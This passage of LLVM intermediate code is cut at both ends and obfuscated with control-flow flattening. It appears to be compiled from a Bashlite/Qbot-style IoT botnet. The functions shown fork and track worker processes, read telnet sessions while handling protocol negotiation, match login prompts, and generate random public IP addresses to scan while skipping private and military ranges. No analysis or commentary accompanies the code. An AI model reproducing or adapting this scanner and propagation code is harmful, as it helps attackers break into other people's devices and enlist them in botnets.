  %75 = getelementptr inbounds [16 x i64], [16 x i64]* %71, i64 0, i64 %74
  %76 = load i64, i64* %75, align 8
  %77 = or i64 %76, %70
  store i64 %77, i64* %75, align 8
  %78 = load i32, i32* %6, align 4
  %79 = add nsw i32 %78, 1
  %80 = call i32 @select(i32 %79, %struct.__sigset_t* null, %struct.__sigset_t* %11, %struct.__sigset_t* null, %struct.timeval* %12)
  %81 = icmp sgt i32 %80, 0
  %82 = select i1 %81, i32 717319702, i32 -1546675249
  store i32 %82, i32* %switchVar
  br label %loopEnd

; <label>:83:                                     ; preds = %loopEntry
  store i32 4, i32* %13, align 4
  %84 = load i32, i32* %6, align 4
  %85 = bitcast i32* %14 to i8*
  %86 = call i32 @getsockopt(i32 %84, i32 1, i32 4, i8* %85, i32* %13) #2
  %87 = load i32, i32* %14, align 4
  %88 = icmp ne i32 %87, 0
  %89 = select i1 %88, i32 -1306275349, i32 -2073624381
  store i32 %89, i32* %switchVar
  br label %loopEnd

; <label>:90:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 -352880903, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  store i32 -1074283419, i32* %switchVar
  br label %loopEnd

; <label>:92:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 -352880903, i32* %switchVar
  br label %loopEnd

; <label>:93:                                     ; preds = %loopEntry
  store i32 -359654298, i32* %switchVar
  br label %loopEnd

; <label>:94:                                     ; preds = %loopEntry
  store i32 0, i32* %5, align 4
  store i32 -352880903, i32* %switchVar
  br label %loopEnd

; <label>:95:                                     ; preds = %loopEntry
  store i32 1349745116, i32* %switchVar
  br label %loopEnd

; <label>:96:                                     ; preds = %loopEntry
  %97 = load i32, i32* %6, align 4
  %98 = call i32 (i32, i32, ...) @fcntl(i32 %97, i32 3, i8* null)
  %99 = sext i32 %98 to i64
  store i64 %99, i64* %15, align 8
  %100 = load i64, i64* %15, align 8
  %101 = and i64 %100, -2049
  store i64 %101, i64* %15, align 8
  %102 = load i32, i32* %6, align 4
  %103 = load i64, i64* %15, align 8
  %104 = call i32 (i32, i32, ...) @fcntl(i32 %102, i32 4, i64 %103)
  store i32 1, i32* %5, align 4
  store i32 -352880903, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  %106 = load i32, i32* %5, align 4
  ret i32 %106

loopEnd:                                          ; preds = %96, %95, %94, %93, %92, %91, %90, %83, %66, %57, %52, %47, %38, %37, %first, %switchDefault
  br label %loopEntry
}

declare i32 @fcntl(i32, i32, ...) #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #8

declare i32 @connect(i32, %struct.sockaddr*, i32) #3

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #2
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  store i32 %6, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 805522550, i32* %switchVar
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 805522550, label %first
    i32 -940344458, label %9
    i32 -1115662179, label %11
    i32 1492679116, label %19
    i32 398287277, label %26
    i32 -1047738039, label %36
    i32 -162148519, label %39
    i32 1576323808, label %49
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %7 = icmp ule i32 %.reload, 0
  %8 = select i1 %7, i32 -940344458, i32 -1115662179
  store i32 %8, i32* %switchVar
  br label %loopEnd

; <label>:9:                                      ; preds = %loopEntry
  %10 = load i32, i32* %2, align 4
  store i32 %10, i32* %1, align 4
  store i32 1576323808, i32* %switchVar
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i64, i64* @numpids, align 8
  %13 = add i64 %12, 1
  store i64 %13, i64* @numpids, align 8
  %14 = load i64, i64* @numpids, align 8
  %15 = add i64 %14, 1
  %16 = mul i64 %15, 4
  %17 = call noalias i8* @malloc(i64 %16) #2
  %18 = bitcast i8* %17 to i32*
  store i32* %18, i32** %3, align 8
  store i32 0, i32* %4, align 4
  store i32 1492679116, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %4, align 4
  %21 = zext i32 %20 to i64
  %22 = load i64, i64* @numpids, align 8
  %23 = sub i64 %22, 1
  %24 = icmp ult i64 %21, %23
  %25 = select i1 %24, i32 398287277, i32 -162148519
  store i32 %25, i32* %switchVar
  br label %loopEnd

; <label>:26:                                     ; preds = %loopEntry
  %27 = load i32*, i32** @pids, align 8
  %28 = load i32, i32* %4, align 4
  %29 = zext i32 %28 to i64
  %30 = getelementptr inbounds i32, i32* %27, i64 %29
  %31 = load i32, i32* %30, align 4
  %32 = load i32*, i32** %3, align 8
  %33 = load i32, i32* %4, align 4
  %34 = zext i32 %33 to i64
  %35 = getelementptr inbounds i32, i32* %32, i64 %34
  store i32 %31, i32* %35, align 4
  store i32 -1047738039, i32* %switchVar
  br label %loopEnd

; <label>:36:                                     ; preds = %loopEntry
  %37 = load i32, i32* %4, align 4
  %38 = add i32 %37, 1
  store i32 %38, i32* %4, align 4
  store i32 1492679116, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i32, i32* %2, align 4
  %41 = load i32*, i32** %3, align 8
  %42 = load i64, i64* @numpids, align 8
  %43 = sub i64 %42, 1
  %44 = getelementptr inbounds i32, i32* %41, i64 %43
  store i32 %40, i32* %44, align 4
  %45 = load i32*, i32** @pids, align 8
  %46 = bitcast i32* %45 to i8*
  call void @free(i8* %46) #2
  %47 = load i32*, i32** %3, align 8
  store i32* %47, i32** @pids, align 8
  %48 = load i32, i32* %2, align 4
  store i32 %48, i32* %1, align 4
  store i32 1576323808, i32* %switchVar
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = load i32, i32* %1, align 4
  ret i32 %50

loopEnd:                                          ; preds = %39, %36, %26, %19, %11, %9, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @fork() #4

; Function Attrs: noinline nounwind uwtable
define i32 @matchPrompt(i8*) #0 {
  %2 = alloca i32, align 4
  %3 = alloca i8*, align 8
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.135, i32 0, i32 0), i8** %4, align 8
  %8 = load i8*, i8** %3, align 8
  %9 = call i64 @strlen(i8* %8) #10
  %10 = trunc i64 %9 to i32
  store i32 %10, i32* %5, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %6, align 4
  %switchVar = alloca i32
  store i32 -226980224, i32* %switchVar
  %.reg2mem = alloca i1
  %.reg2mem2 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -226980224, label %11
    i32 -879193475, label %18
    i32 -1906501749, label %19
    i32 1031581783, label %24
    i32 -1250508526, label %37
    i32 -35719415, label %50
    i32 952093921, label %63
    i32 -737700699, label %75
    i32 623683869, label %76
    i32 689017702, label %78
    i32 1202035439, label %81
    i32 1087933833, label %100
    i32 421356394, label %101
    i32 -893572795, label %102
    i32 -1731841700, label %105
    i32 -775855870, label %106
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:11:                                     ; preds = %loopEntry
  %12 = load i32, i32* %6, align 4
  %13 = sext i32 %12 to i64
  %14 = load i8*, i8** %4, align 8
  %15 = call i64 @strlen(i8* %14) #10
  %16 = icmp ult i64 %13, %15
  %17 = select i1 %16, i32 -879193475, i32 -1731841700
  store i32 %17, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  store i32 -1906501749, i32* %switchVar
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i32, i32* %5, align 4
  %21 = load i32, i32* %7, align 4
  %22 = icmp sgt i32 %20, %21
  %23 = select i1 %22, i32 1031581783, i32 623683869
  store i32 %23, i32* %switchVar
  store i1 false, i1* %.reg2mem2
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i8*, i8** %3, align 8
  %26 = load i32, i32* %5, align 4
  %27 = sext i32 %26 to i64
  %28 = getelementptr inbounds i8, i8* %25, i64 %27
  %29 = load i32, i32* %7, align 4
  %30 = sext i32 %29 to i64
  %31 = sub i64 0, %30
  %32 = getelementptr inbounds i8, i8* %28, i64 %31
  %33 = load i8, i8* %32, align 1
  %34 = sext i8 %33 to i32
  %35 = icmp eq i32 %34, 0
  %36 = select i1 %35, i32 -737700699, i32 -1250508526
  store i32 %36, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i8*, i8** %3, align 8
  %39 = load i32, i32* %5, align 4
  %40 = sext i32 %39 to i64
  %41 = getelementptr inbounds i8, i8* %38, i64 %40
  %42 = load i32, i32* %7, align 4
  %43 = sext i32 %42 to i64
  %44 = sub i64 0, %43
  %45 = getelementptr inbounds i8, i8* %41, i64 %44
  %46 = load i8, i8* %45, align 1
  %47 = sext i8 %46 to i32
  %48 = icmp eq i32 %47, 32
  %49 = select i1 %48, i32 -737700699, i32 -35719415
  store i32 %49, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:50:                                     ; preds = %loopEntry
  %51 = load i8*, i8** %3, align 8
  %52 = load i32, i32* %5, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds i8, i8* %51, i64 %53
  %55 = load i32, i32* %7, align 4
  %56 = sext i32 %55 to i64
  %57 = sub i64 0, %56
  %58 = getelementptr inbounds i8, i8* %54, i64 %57
  %59 = load i8, i8* %58, align 1
  %60 = sext i8 %59 to i32
  %61 = icmp eq i32 %60, 13
  %62 = select i1 %61, i32 -737700699, i32 952093921
  store i32 %62, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:63:                                     ; preds = %loopEntry
  %64 = load i8*, i8** %3, align 8
  %65 = load i32, i32* %5, align 4
  %66 = sext i32 %65 to i64
  %67 = getelementptr inbounds i8, i8* %64, i64 %66
  %68 = load i32, i32* %7, align 4
  %69 = sext i32 %68 to i64
  %70 = sub i64 0, %69
  %71 = getelementptr inbounds i8, i8* %67, i64 %70
  %72 = load i8, i8* %71, align 1
  %73 = sext i8 %72 to i32
  %74 = icmp eq i32 %73, 10
  store i32 -737700699, i32* %switchVar
  store i1 %74, i1* %.reg2mem
  br label %loopEnd

; <label>:75:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  store i32 623683869, i32* %switchVar
  store i1 %.reload, i1* %.reg2mem2
  br label %loopEnd

; <label>:76:                                     ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  %77 = select i1 %.reload3, i32 689017702, i32 1202035439
  store i32 %77, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %79 = load i32, i32* %7, align 4
  %80 = add nsw i32 %79, 1
  store i32 %80, i32* %7, align 4
  store i32 -1906501749, i32* %switchVar
  br label %loopEnd

; <label>:81:                                     ; preds = %loopEntry
  %82 = load i8*, i8** %3, align 8
  %83 = load i32, i32* %5, align 4
  %84 = sext i32 %83 to i64
  %85 = getelementptr inbounds i8, i8* %82, i64 %84
  %86 = load i32, i32* %7, align 4
  %87 = sext i32 %86 to i64
  %88 = sub i64 0, %87
  %89 = getelementptr inbounds i8, i8* %85, i64 %88
  %90 = load i8, i8* %89, align 1
  %91 = sext i8 %90 to i32
  %92 = load i8*, i8** %4, align 8
  %93 = load i32, i32* %6, align 4
  %94 = sext i32 %93 to i64
  %95 = getelementptr inbounds i8, i8* %92, i64 %94
  %96 = load i8, i8* %95, align 1
  %97 = sext i8 %96 to i32
  %98 = icmp eq i32 %91, %97
  %99 = select i1 %98, i32 1087933833, i32 421356394
  store i32 %99, i32* %switchVar
  br label %loopEnd

; <label>:100:                                    ; preds = %loopEntry
  store i32 1, i32* %2, align 4
  store i32 -775855870, i32* %switchVar
  br label %loopEnd

; <label>:101:                                    ; preds = %loopEntry
  store i32 -893572795, i32* %switchVar
  br label %loopEnd

; <label>:102:                                    ; preds = %loopEntry
  %103 = load i32, i32* %6, align 4
  %104 = add nsw i32 %103, 1
  store i32 %104, i32* %6, align 4
  store i32 -226980224, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  store i32 0, i32* %2, align 4
  store i32 -775855870, i32* %switchVar
  br label %loopEnd

; <label>:106:                                    ; preds = %loopEntry
  %107 = load i32, i32* %2, align 4
  ret i32 %107

loopEnd:                                          ; preds = %105, %102, %101, %100, %81, %78, %76, %75, %63, %50, %37, %24, %19, %18, %11, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @readUntil(i32, i8*, i32, i32, i32, i8*, i32, i32) #0 {
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8*, align 8
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca i32, align 4
  %19 = alloca i32, align 4
  %20 = alloca i32, align 4
  %21 = alloca %struct.__sigset_t, align 8
  %22 = alloca %struct.timeval, align 8
  %23 = alloca i8*, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  store i32 %0, i32* %10, align 4
  store i8* %1, i8** %11, align 8
  store i32 %2, i32* %12, align 4
  store i32 %3, i32* %13, align 4
  store i32 %4, i32* %14, align 4
  store i8* %5, i8** %15, align 8
  store i32 %6, i32* %16, align 4
  store i32 %7, i32* %17, align 4
  %26 = load i32, i32* %17, align 4
  store i32 %26, i32* %18, align 4
  store i32 0, i32* %19, align 4
  store i32 0, i32* %20, align 4
  %27 = load i32, i32* %13, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  store i64 %28, i64* %29, align 8
  %30 = load i32, i32* %14, align 4
  %31 = sext i32 %30 to i64
  %32 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  store i64 %31, i64* %32, align 8
  store i8* null, i8** %23, align 8
  %switchVar = alloca i32
  store i32 -1426674997, i32* %switchVar
  %.reg2mem = alloca i1
  %.reg2mem2 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %8
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1426674997, label %33
    i32 1718684698, label %39
    i32 -1766365304, label %44
    i32 582831637, label %48
    i32 1048415376, label %49
    i32 -726374680, label %51
    i32 -138686949, label %52
    i32 -1007510112, label %61
    i32 -2050805394, label %78
    i32 -710046186, label %79
    i32 1469631202, label %91
    i32 1654293445, label %95
    i32 716190859, label %96
    i32 -1281196111, label %105
    i32 -1040806165, label %114
    i32 -1069282482, label %118
    i32 1879939053, label %119
    i32 -1178806656, label %128
    i32 669124460, label %129
    i32 347657354, label %130
    i32 1935057112, label %136
    i32 -1410955567, label %140
    i32 3729599, label %145
    i32 -1797227027, label %146
    i32 527008659, label %147
    i32 2100694208, label %148
    i32 1201551091, label %152
    i32 302691402, label %153
    i32 161948224, label %154
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:33:                                     ; preds = %loopEntry
  %34 = load i32, i32* %18, align 4
  %35 = add nsw i32 %34, 2
  %36 = load i32, i32* %16, align 4
  %37 = icmp slt i32 %35, %36
  %38 = select i1 %37, i32 1718684698, i32 1048415376
  store i32 %38, i32* %switchVar
  store i1 false, i1* %.reg2mem2
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 0
  %41 = load i64, i64* %40, align 8
  %42 = icmp sgt i64 %41, 0
  %43 = select i1 %42, i32 582831637, i32 -1766365304
  store i32 %43, i32* %switchVar
  store i1 true, i1* %.reg2mem
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = getelementptr inbounds %struct.timeval, %struct.timeval* %22, i32 0, i32 1
  %46 = load i64, i64* %45, align 8
  %47 = icmp sgt i64 %46, 0
  store i32 582831637, i32* %switchVar
  store i1 %47, i1* %.reg2mem
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  store i32 1048415376, i32* %switchVar
  store i1 %.reload, i1* %.reg2mem2
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  %50 = select i1 %.reload3, i32 -726374680, i32 2100694208
  store i32 %50, i32* %switchVar
  br label %loopEnd

; <label>:51:                                     ; preds = %loopEntry
  store i32 -138686949, i32* %switchVar
  br label %loopEnd

; <label>:52:                                     ; preds = %loopEntry
  %53 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %21, i32 0, i32 0
  %54 = getelementptr inbounds [16 x i64], [16 x i64]* %53, i64 0, i64 0
  %55 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %54) #2, !srcloc !5
  %56 = extractvalue { i64, i64* } %55, 0
  %57 = extractvalue { i64, i64* } %55, 1
  %58 = trunc i64 %56 to i32
  store i32 %58, i32* %24, align 4
  %59 = ptrtoint i64* %57 to i64
  %60 = trunc i64 %59 to i32
  store i32 %60, i32* %25, align 4
  store i32 -1007510112, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  %62 = load i32, i32* %10, align 4
  %63 = srem i32 %62, 64
  %64 = zext i32 %63 to i64
  %65 = shl i64 1, %64
  %66 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %21, i32 0, i32 0
  %67 = load i32, i32* %10, align 4
  %68 = sdiv i32 %67, 64
  %69 = sext i32 %68 to i64
  %70 = getelementptr inbounds [16 x i64], [16 x i64]* %66, i64 0, i64 %69
  %71 = load i64, i64* %70, align 8
  %72 = or i64 %71, %65
  store i64 %72, i64* %70, align 8
  %73 = load i32, i32* %10, align 4
  %74 = add nsw i32 %73, 1
  %75 = call i32 @select(i32 %74, %struct.__sigset_t* %21, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* %22)
  %76 = icmp slt i32 %75, 1
  %77 = select i1 %76, i32 -2050805394, i32 -710046186
  store i32 %77, i32* %switchVar
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  store i32 2100694208, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  %80 = load i8*, i8** %15, align 8
  %81 = load i32, i32* %18, align 4
  %82 = sext i32 %81 to i64
  %83 = getelementptr inbounds i8, i8* %80, i64 %82
  store i8* %83, i8** %23, align 8
  %84 = load i32, i32* %10, align 4
  %85 = load i8*, i8** %23, align 8
  %86 = call i64 @recv(i32 %84, i8* %85, i64 1, i32 0)
  %87 = trunc i64 %86 to i32
  store i32 %87, i32* %19, align 4
  %88 = load i32, i32* %19, align 4
  %89 = icmp eq i32 %88, -1
  %90 = select i1 %89, i32 1654293445, i32 1469631202
  store i32 %90, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  %92 = load i32, i32* %19, align 4
  %93 = icmp eq i32 %92, 0
  %94 = select i1 %93, i32 1654293445, i32 716190859
  store i32 %94, i32* %switchVar
  br label %loopEnd

; <label>:95:                                     ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 161948224, i32* %switchVar
  br label %loopEnd

; <label>:96:                                     ; preds = %loopEntry
  %97 = load i32, i32* %19, align 4
  %98 = load i32, i32* %18, align 4
  %99 = add nsw i32 %98, %97
  store i32 %99, i32* %18, align 4
  %100 = load i8*, i8** %23, align 8
  %101 = load i8, i8* %100, align 1
  %102 = zext i8 %101 to i32
  %103 = icmp eq i32 %102, 255
  %104 = select i1 %103, i32 -1281196111, i32 347657354
  store i32 %104, i32* %switchVar
  br label %loopEnd

; <label>:105:                                    ; preds = %loopEntry
  %106 = load i32, i32* %10, align 4
  %107 = load i8*, i8** %23, align 8
  %108 = getelementptr inbounds i8, i8* %107, i64 1
  %109 = call i64 @recv(i32 %106, i8* %108, i64 2, i32 0)
  %110 = trunc i64 %109 to i32
  store i32 %110, i32* %19, align 4
  %111 = load i32, i32* %19, align 4
  %112 = icmp eq i32 %111, -1
  %113 = select i1 %112, i32 -1069282482, i32 -1040806165
  store i32 %113, i32* %switchVar
  br label %loopEnd

; <label>:114:                                    ; preds = %loopEntry
  %115 = load i32, i32* %19, align 4
  %116 = icmp eq i32 %115, 0
  %117 = select i1 %116, i32 -1069282482, i32 1879939053
  store i32 %117, i32* %switchVar
  br label %loopEnd

; <label>:118:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 161948224, i32* %switchVar
  br label %loopEnd

; <label>:119:                                    ; preds = %loopEntry
  %120 = load i32, i32* %19, align 4
  %121 = load i32, i32* %18, align 4
  %122 = add nsw i32 %121, %120
  store i32 %122, i32* %18, align 4
  %123 = load i32, i32* %10, align 4
  %124 = load i8*, i8** %23, align 8
  %125 = call i32 @negotiate(i32 %123, i8* %124, i32 3)
  %126 = icmp ne i32 %125, 0
  %127 = select i1 %126, i32 669124460, i32 -1178806656
  store i32 %127, i32* %switchVar
  br label %loopEnd

; <label>:128:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 161948224, i32* %switchVar
  br label %loopEnd

; <label>:129:                                    ; preds = %loopEntry
  store i32 527008659, i32* %switchVar
  br label %loopEnd

; <label>:130:                                    ; preds = %loopEntry
  %131 = load i8*, i8** %15, align 8
  %132 = load i8*, i8** %11, align 8
  %133 = call i8* @strstr(i8* %131, i8* %132) #10
  %134 = icmp ne i8* %133, null
  %135 = select i1 %134, i32 3729599, i32 1935057112
  store i32 %135, i32* %switchVar
  br label %loopEnd

; <label>:136:                                    ; preds = %loopEntry
  %137 = load i32, i32* %12, align 4
  %138 = icmp ne i32 %137, 0
  %139 = select i1 %138, i32 -1410955567, i32 -1797227027
  store i32 %139, i32* %switchVar
  br label %loopEnd

; <label>:140:                                    ; preds = %loopEntry
  %141 = load i8*, i8** %15, align 8
  %142 = call i32 @matchPrompt(i8* %141)
  %143 = icmp ne i32 %142, 0
  %144 = select i1 %143, i32 3729599, i32 -1797227027
  store i32 %144, i32* %switchVar
  br label %loopEnd

; <label>:145:                                    ; preds = %loopEntry
  store i32 1, i32* %20, align 4
  store i32 2100694208, i32* %switchVar
  br label %loopEnd

; <label>:146:                                    ; preds = %loopEntry
  store i32 527008659, i32* %switchVar
  br label %loopEnd

; <label>:147:                                    ; preds = %loopEntry
  store i32 -1426674997, i32* %switchVar
  br label %loopEnd

; <label>:148:                                    ; preds = %loopEntry
  %149 = load i32, i32* %20, align 4
  %150 = icmp ne i32 %149, 0
  %151 = select i1 %150, i32 1201551091, i32 302691402
  store i32 %151, i32* %switchVar
  br label %loopEnd

; <label>:152:                                    ; preds = %loopEntry
  store i32 1, i32* %9, align 4
  store i32 161948224, i32* %switchVar
  br label %loopEnd

; <label>:153:                                    ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 161948224, i32* %switchVar
  br label %loopEnd

; <label>:154:                                    ; preds = %loopEntry
  %155 = load i32, i32* %9, align 4
  ret i32 %155

loopEnd:                                          ; preds = %153, %152, %148, %147, %146, %145, %140, %136, %130, %129, %128, %119, %118, %114, %105, %96, %95, %91, %79, %78, %61, %52, %51, %49, %48, %44, %39, %33, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @GetRandomPublicIP() #0 {
  %1 = alloca [16 x i8], align 16
  %2 = call i32 @rand() #2
  %3 = srem i32 %2, 223
  %4 = trunc i32 %3 to i8
  store i8 %4, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %5 = call i32 @rand() #2
  %6 = srem i32 %5, 255
  %7 = trunc i32 %6 to i8
  store i8 %7, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 1), align 1
  %8 = call i32 @rand() #2
  %9 = srem i32 %8, 255
  %10 = trunc i32 %9 to i8
  store i8 %10, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 2), align 1
  %11 = call i32 @rand() #2
  %12 = srem i32 %11, 255
  %13 = trunc i32 %12 to i8
  store i8 %13, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 3), align 1
  %switchVar = alloca i32
  store i32 1377781326, i32* %switchVar
  %.reg2mem = alloca i1
  %.reg2mem2 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %0
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1377781326, label %14
    i32 916982818, label %19
    i32 -1362452625, label %24
    i32 -15365234, label %29
    i32 -523284182, label %34
    i32 -1641655121, label %39
    i32 -1895345726, label %44
    i32 -1675396126, label %49
    i32 1514249999, label %54
    i32 -1956995232, label %59
    i32 -973677244, label %64
    i32 857635743, label %69
    i32 1543773581, label %74
    i32 -679641391, label %79
    i32 842544984, label %84
    i32 746250975, label %89
    i32 -1385549260, label %94
    i32 -1062653651, label %99
    i32 1596713542, label %104
    i32 -449047235, label %109
    i32 -1233509079, label %114
    i32 1925633519, label %119
    i32 -1613745128, label %124
    i32 -483465904, label %129
    i32 1024802597, label %134
    i32 2039766078, label %139
    i32 -1113616903, label %144
    i32 1618904662, label %149
    i32 920153208, label %154
    i32 382712358, label %159
    i32 1725604874, label %164
    i32 1723435488, label %169
    i32 302904677, label %174
    i32 -263718256, label %179
    i32 510631984, label %183
    i32 1010125045, label %184
    i32 -847096394, label %186
    i32 -61531965, label %199
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  %15 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %16 = zext i8 %15 to i32
  %17 = icmp eq i32 %16, 127
  %18 = select i1 %17, i32 1010125045, i32 916982818
  store i32 %18, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:19:                                     ; preds = %loopEntry
  %20 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %21 = zext i8 %20 to i32
  %22 = icmp eq i32 %21, 0
  %23 = select i1 %22, i32 1010125045, i32 -1362452625
  store i32 %23, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:24:                                     ; preds = %loopEntry
  %25 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %26 = zext i8 %25 to i32
  %27 = icmp eq i32 %26, 3
  %28 = select i1 %27, i32 1010125045, i32 -15365234
  store i32 %28, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %31 = zext i8 %30 to i32
  %32 = icmp eq i32 %31, 15
  %33 = select i1 %32, i32 1010125045, i32 -523284182
  store i32 %33, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  %35 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %36 = zext i8 %35 to i32
  %37 = icmp eq i32 %36, 16
  %38 = select i1 %37, i32 1010125045, i32 -1641655121
  store i32 %38, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %41 = zext i8 %40 to i32
  %42 = icmp eq i32 %41, 56
  %43 = select i1 %42, i32 1010125045, i32 -1895345726
  store i32 %43, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %46 = zext i8 %45 to i32
  %47 = icmp eq i32 %46, 10
  %48 = select i1 %47, i32 1010125045, i32 -1675396126
  store i32 %48, i32* %switchVar
  store i1 true, i1* %.reg2mem2
  br label %loopEnd

; <label>:49:                                     ; preds = %loopEntry
  %50 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GetRandomPublicIP.ipState, i64 0, i64 0), align 1
  %51 = zext i8 %50 to i32
  %52 = icmp eq i32 %51, 192
  %53 = select i1 %52, i32 1514249999, i32 -1956995232
  store i32 %53, i32* %switchVar
